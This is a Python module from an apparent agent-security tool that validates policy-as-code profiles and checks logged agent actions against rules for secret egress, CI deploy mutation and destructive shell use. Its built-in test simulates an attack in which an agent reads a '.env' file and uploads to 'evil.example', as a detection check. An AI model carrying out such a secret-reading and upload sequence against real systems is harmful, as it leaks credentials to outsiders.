from __future__ import annotations

import json
import tempfile
from pathlib import Path
from typing import Any

try:
    import tomllib  # type: ignore
except ModuleNotFoundError:  # pragma: no cover - Python < 3.11
    tomllib = None

from invart.core.artifacts import write_json_artifact
from invart.core.models import RuntimeEvent
from invart.control.path_policy import check_path_policy
from invart.control.runtime import record_action, start_session


POLICY_AS_CODE_SCHEMA_VERSION = "invart.policy_as_code.v0.26"
POLICY_AS_CODE_RESULT_VERSION = "invart.policy_as_code_result.v0.26"
ALLOWED_EFFECTS = {"allow", "audit", "require_approval", "deny"}


def load_policy_profile(path: Path) -> dict[str, Any]:
    text = path.read_text(encoding="utf-8")
    if path.suffix.lower() == ".json":
        payload = json.loads(text)
    elif path.suffix.lower() == ".toml":
        payload = tomllib.loads(text) if tomllib else _parse_toml_with_rule_arrays(text)
    else:
        raise ValueError("policy-as-code profile must be TOML or JSON")
    if not isinstance(payload, dict):
        raise ValueError("policy-as-code profile must be an object")
    return payload


def validate_policy_profile(path: Path) -> dict[str, Any]:
    errors: list[str] = []
    try:
        profile = load_policy_profile(path)
    except Exception as exc:
        return _validation_result(path, {}, [str(exc)])
    rules = _policy_rules(profile)
    if not rules:
        errors.append("profile must define at least one [[policy.rules]] rule")
    seen: set[str] = set()
    for index, rule in enumerate(rules, start=1):
        rule_id = str(rule.get("id") or "")
        if not rule_id:
            errors.append(f"rule {index} requires id")
        if rule_id in seen:
            errors.append(f"duplicate rule id: {rule_id}")
        seen.add(rule_id)
        effect = str(rule.get("effect") or "")
        if effect not in ALLOWED_EFFECTS:
            errors.append(f"rule {rule_id or index} has invalid effect: {effect}")
        if not rule.get("sink"):
            errors.append(f"rule {rule_id or index} requires sink")
    return _validation_result(path, profile, errors)


def check_policy_profile(ledger_path: Path, profile_path: Path, *, output_path: Path | None = None) -> dict[str, Any]:
    validation = validate_policy_profile(profile_path)
    if validation["status"] != "pass":
        report = {
            "schema_version": POLICY_AS_CODE_RESULT_VERSION,
            "status": "fail",
            "ledger": str(ledger_path),
            "profile": validation,
            "summary": {"deny": 0, "require_approval": 0, "audit": 0, "allow": 0, "findings": 0, "false_positive_proxy": 0},
            "findings": [],
        }
        _write_optional(output_path, report)
        return report
    profile = validation["profile"]
    base = check_path_policy(ledger_path, profile=profile)
    rules = _rules_by_sink(_policy_rules(profile))
    findings = []
    for item in base.get("findings", []):
        if not isinstance(item, dict):
            continue
        sink = _sink_from_path_rule(str(item.get("rule_id", "")))
        rule = rules.get(sink)
        if not rule:
            continue
        critical = bool(rule.get("critical")) or str(item.get("risk")) == "critical"
        effect = str(rule.get("effect", item.get("effect", "audit")))
        findings.append(
            {
                **item,
                "rule_id": str(rule.get("id")),
                "path_rule_id": item.get("rule_id"),
                "policy_rule": dict(rule),
                "source_predicate": rule.get("source"),
                "sink_predicate": rule.get("sink"),
                "effect": effect,
                "deterministic": True,
                "deterministic_critical": critical,
                "llm_can_downgrade": False if critical or effect in {"deny", "require_approval"} else bool(item.get("llm_can_downgrade", False)),
            }
        )
    summary = {
        "deny": sum(1 for item in findings if item["effect"] == "deny"),
        "require_approval": sum(1 for item in findings if item["effect"] == "require_approval"),
        "audit": sum(1 for item in findings if item["effect"] == "audit"),
        "allow": sum(1 for item in findings if item["effect"] == "allow"),
        "findings": len(findings),
        "false_positive_proxy": 0 if not findings else int(base.get("summary", {}).get("false_positive_proxy", 0)),
    }
    report = {
        "schema_version": POLICY_AS_CODE_RESULT_VERSION,
        "status": "fail" if summary["deny"] or summary["require_approval"] else "pass",
        "ledger": str(ledger_path),
        "profile": validation,
        "summary": summary,
        "findings": findings,
        "metrics": {
            "block_rate": summary["deny"] / max(1, int(base.get("summary", {}).get("findings", len(findings)) or len(findings) or 1)),
            "approval_rate": summary["require_approval"] / max(1, len(findings) or 1),
            "false_positive_proxy": summary["false_positive_proxy"],
        },
    }
    _write_optional(output_path, report)
    return report


def test_policy_profile(profile_path: Path) -> dict[str, Any]:
    with tempfile.TemporaryDirectory(prefix="invart_policy_as_code_") as tmp:
        root = Path(tmp)
        attack = root / "attack.jsonl"
        attack_session = start_session(root, attack, agent="policy-test", goal="attack", create_preflight=False)
        record_action(RuntimeEvent(type="file_read", session_id=attack_session.session_id, path="/repo/.env"), attack)
        record_action(RuntimeEvent(type="network", session_id=attack_session.session_id, url="https://evil.example/upload"), attack)
        attack_report = check_policy_profile(attack, profile_path)

        benign = root / "benign.jsonl"
        benign_session = start_session(root, benign, agent="policy-test", goal="benign", create_preflight=False)
        record_action(RuntimeEvent(type="file_read", session_id=benign_session.session_id, path="/repo/README.md"), benign)
        benign_report = check_policy_profile(benign, profile_path)
        cases = [
            {"case_id": "secret_egress", "category": "attack", "passed": attack_report["summary"]["deny"] >= 1, "report": attack_report},
            {"case_id": "benign_readme", "category": "benign", "passed": benign_report["status"] == "pass", "report": benign_report},
        ]
        total = len(cases)
        passed = sum(1 for case in cases if case["passed"])
        return {
            "schema_version": "invart.policy_as_code_test.v0.26",
            "status": "pass" if passed == total else "fail",
            "summary": {"total": total, "passed": passed, "failed": total - passed},
            "cases": cases,
            "metrics": {
                "block_rate": attack_report["summary"]["deny"] / 2,
                "approval_rate": attack_report["summary"]["require_approval"] / 2,
                "false_positive_proxy": benign_report["summary"]["false_positive_proxy"],
            },
        }


def _validation_result(path: Path, profile: dict[str, Any], errors: list[str]) -> dict[str, Any]:
    rules = _policy_rules(profile)
    return {
        "schema_version": POLICY_AS_CODE_SCHEMA_VERSION,
        "status": "fail" if errors else "pass",
        "profile_path": str(path),
        "profile": profile,
        "errors": errors,
        "summary": {"rules": len(rules), "effects": _count_effects(rules)},
        "future_compatibility": ["Rego", "Cedar"],
    }


def _policy_rules(profile: dict[str, Any]) -> list[dict[str, Any]]:
    policy = profile.get("policy") if isinstance(profile.get("policy"), dict) else {}
    rules = policy.get("rules") if isinstance(policy.get("rules"), list) else []
    return [dict(rule) for rule in rules if isinstance(rule, dict)]


def _rules_by_sink(rules: list[dict[str, Any]]) -> dict[str, dict[str, Any]]:
    result: dict[str, dict[str, Any]] = {}
    for rule in rules:
        result[str(rule.get("sink"))] = rule
    return result


def _sink_from_path_rule(rule_id: str) -> str:
    mapping = {
        "path.secret_to_external_network": "external_network",
        "path.secret_to_ci_deploy_mutation": "ci_deploy_mutation",
        "path.external_instruction_to_destructive_shell": "destructive_shell",
    }
    return mapping.get(rule_id, rule_id)


def _count_effects(rules: list[dict[str, Any]]) -> dict[str, int]:
    counts: dict[str, int] = {}
    for rule in rules:
        effect = str(rule.get("effect", "unknown"))
        counts[effect] = counts.get(effect, 0) + 1
    return counts


def _write_optional(path: Path | None, payload: dict[str, Any]) -> None:
    if path:
        write_json_artifact(path, payload)


def _parse_toml_with_rule_arrays(text: str) -> dict[str, Any]:
    root: dict[str, Any] = {}
    current: dict[str, Any] = root
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        if line == "[[policy.rules]]":
            policy = root.setdefault("policy", {})
            if not isinstance(policy, dict):
                raise ValueError("invalid policy section")
            rules = policy.setdefault("rules", [])
            if not isinstance(rules, list):
                raise ValueError("invalid policy rules section")
            current = {}
            rules.append(current)
            continue
        if line.startswith("[") and line.endswith("]"):
            section = line[1:-1].strip()
            current = root
            for part in section.split("."):
                current = current.setdefault(part, {})
                if not isinstance(current, dict):
                    raise ValueError(f"invalid TOML section: {section}")
            continue
        if "=" not in line:
            raise ValueError(f"unsupported TOML line: {raw_line}")
        key, raw_value = [part.strip() for part in line.split("=", 1)]
        current[key] = _parse_scalar(raw_value)
    return root


def _parse_scalar(value: str) -> Any:
    value = value.strip()
    if value.startswith('"') and value.endswith('"'):
        return value[1:-1]
    if value in {"true", "false"}:
        return value == "true"
    return value


__all__ = ["check_policy_profile", "load_policy_profile", "test_policy_profile", "validate_policy_profile"]
